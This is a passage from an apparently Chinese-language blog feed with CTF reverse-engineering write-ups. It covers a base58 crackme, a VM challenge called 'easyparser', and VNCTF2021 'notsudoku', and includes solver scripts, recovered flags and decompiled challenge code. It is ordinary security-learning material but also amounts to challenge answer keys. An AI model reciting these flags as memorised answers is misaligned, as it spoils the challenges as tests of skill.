    des_v9[v16 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; l] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_602500[(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)v20[v12 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; l]];&lt;span style=&#34;color:#75715e&#34;&gt;// 转成base58
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  des_v9[v12 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v16] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一看到一堆58的取模和除法，猜测是base58编码&lt;/p&gt;
&lt;p&gt;然后动调拿一下table&lt;/p&gt;
&lt;p&gt;接下来看第二个函数，发现输入竟然最后比较的时候才出现，整个函数都是用来生成正确密文的，于是直接动调拿密文&lt;/p&gt;
&lt;p&gt;写个脚本求解就行了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;]

init &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA4&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFA&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB3&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x88&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDB&lt;/span&gt;
]

true_table &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(init)):
    init[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; i
    true_table &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; init[i]

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; base58 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe&amp;#39;&lt;/span&gt;
fake_table &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&amp;#39;&lt;/span&gt;
true_flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(flag)):
    true_flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; fake_table[true_table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(flag[i])]

print (b58decode(true_flag))
&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;\x06flag{63510cf7-2b80-45e1-a186-21234897e5cd}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到flag&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;拿到flag之后用程序验证，结果发现没有通过，以为自己只在第一层，base58分析错了，于是从头认真读代码
最后上网看了wp，才发现flag就是过不了验证&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;easyparser&#34;&gt;easyparser&lt;/h2&gt;
&lt;p&gt;见过的最大的VM了，边动调边读指令&lt;/p&gt;
&lt;p&gt;先是一堆初始化，直接动调过去，找输入&lt;/p&gt;
&lt;p&gt;发现用了个循环，先将输入放到一个地址里&lt;/p&gt;
&lt;p&gt;判断最后一个是否为 &lt;code&gt;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后，将输入的一部分取出，存到了某个地址+0xE1到+0x100，正好32位&lt;/p&gt;
&lt;p&gt;然后判断一下头是不是 &lt;code&gt;flag{&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来又进入一个循环，发现将某个地址的数字取出，存到了7号寄存器中，然后将对应位的输入取出，存到6号寄存器中&lt;/p&gt;
&lt;p&gt;对6号寄存器分别进行了 &lt;code&gt;^0x63&lt;/code&gt; 和 &lt;code&gt;&amp;lt;&amp;lt;2&lt;/code&gt; 两个指令&lt;/p&gt;
&lt;p&gt;然后和7号寄存器进行比较&lt;/p&gt;
&lt;p&gt;猜测对所有明文都进行了同样的加密，所以直接从地址中取出密文，解密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;332&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;132&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;208&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;276&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;264&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cipher:
    print (chr((c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print ()
&lt;span style=&#34;color:#75715e&#34;&gt;# G0d_Bless_Wuhan_&amp;amp;_China_Growth!_&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>VNCTF2021 FilpGame and notsudoku</title>
        <link>/post/vnctf2021-filpgame-and-notsudoku/</link>
        <pubDate>Thu, 25 Mar 2021 03:06:10 +0000</pubDate>
        
        <guid>/post/vnctf2021-filpgame-and-notsudoku/</guid>
        <description>&lt;h2 id=&#34;notsudoku&#34;&gt;notsudoku&lt;/h2&gt;
&lt;p&gt;V&amp;amp;NCTF直接白给了，全程耗在了Crackme2上，辛辛苦苦找到密文和算法后发现需要动态调试？过程中not sudoku这题就扫了一眼，结果还没发现是python逆向，于是就爬爬了。&lt;/p&gt;
&lt;h3 id=&#34;正文&#34;&gt;正文&lt;/h3&gt;
&lt;p&gt;好像是第一次做python exe的逆向&lt;/p&gt;
&lt;p&gt;首先使用 &lt;code&gt;exeinfo&lt;/code&gt; 差壳，发现有个 &lt;code&gt;UPX&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;upx.exe -d&lt;/code&gt; 脱壳&lt;/p&gt;
&lt;p&gt;比赛的时候没想到这个是python逆向，直接拖到ida里面了，于是直接gg&lt;/p&gt;
&lt;p&gt;再使用 &lt;code&gt;exeinfo&lt;/code&gt; 查一下，会发现是 &lt;code&gt;pyinstaller&lt;/code&gt; 编译的文件，说明是python逆向&lt;/p&gt;
&lt;p&gt;上网下载一下 &lt;code&gt;pyinstxtractor.py&lt;/code&gt; 进行反编译&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ python3 pyinstxtractor.py notsudoku-noupx.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入文件夹，找没有后缀的文件，发现有一个叫做 &lt;code&gt;2&lt;/code&gt; 的，使用 &lt;code&gt;010editor&lt;/code&gt; 从 &lt;code&gt;struct&lt;/code&gt; 文件复制文件头（第一行），然后添加 &lt;code&gt;.pyc&lt;/code&gt; 后缀，进行 &lt;code&gt;pyc&lt;/code&gt; 反编译&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ uncompyle6 -o 2.py 2.pyc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;即可得到 python 源码文件&lt;/p&gt;
&lt;p&gt;发现文件里有一些日文，于是边阅读边修改就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# uncompyle6 version 3.7.4&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Python bytecode 3.7 (3394)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Decompiled from: Python 3.6.9 (default, Jan 26 2021, 15:33:00) &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# [GCC 8.4.0]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Embedded file name: 2.py&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Compiled at: 1995-09-28 00:18:56&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Size of source mod 2**32: 272 bytes&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; hashlib

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class_a&lt;/span&gt;:

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;int &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;え&lt;/span&gt;(self, other):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;の&lt;/span&gt;(f):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dic[other] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; f

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; の

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;お&lt;/span&gt;(self, other):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(other)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
            invoke &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_a[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
            value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_a[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
            value_2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_a[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
            func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;お(invoke)
            func(value, value_2)
            i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;


object_a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; class_a()

&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; b


&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        print(object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
            print(object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
                print((object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flag), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                print(a, end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)


&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()


&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input()


&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sleep&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(a)


&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;crypt&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ord(i) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; ord(i) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;# input &amp;gt; &amp;#39;0&amp;#39;, input &amp;lt; &amp;#39;4&amp;#39;&lt;/span&gt;
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()

